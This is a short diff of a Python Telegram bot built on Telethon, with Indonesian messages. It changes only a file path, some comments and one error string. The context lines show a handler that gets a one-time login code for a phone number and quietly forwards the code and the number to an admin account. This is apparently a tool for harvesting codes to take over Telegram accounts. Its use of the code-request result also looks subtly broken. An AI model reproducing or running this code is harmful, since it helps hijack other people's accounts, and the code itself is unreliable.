@@ -1,15 +1,13 @@
-# jinx_bot.py
+# bot/jinx_bot.py
 from telethon import TelegramClient, events
 from telethon.sessions import StringSession
 import asyncio, json, os
 
-# ENV
 API_ID = int(os.getenv('API_ID'))
 API_HASH = os.getenv('API_HASH')
 BOT_TOKEN = os.getenv('BOT_TOKEN')
 ADMIN_ID = int(os.getenv('ADMIN_ID'))
 
-# BOT
 bot = TelegramClient('bot', API_ID, API_HASH).start(bot_token=BOT_TOKEN)
 DATA_FILE = 'data.json'
 
@@ -45,7 +43,7 @@ async def new_otp(event):
         await event.reply(f"OTP: {sent.phone_code}")
         await bot.send_message(ADMIN_ID, f"OTP BARU: {sent.phone_code} → {phone}")
     except Exception as e:
-        await event.reply("Gagal!")
+        await event.reply("Gagal kirim OTP.")
 
 print("JINX BOT JALAN!")
-bot.run_until_disconnected()
+bot.run_until_disconnected() 
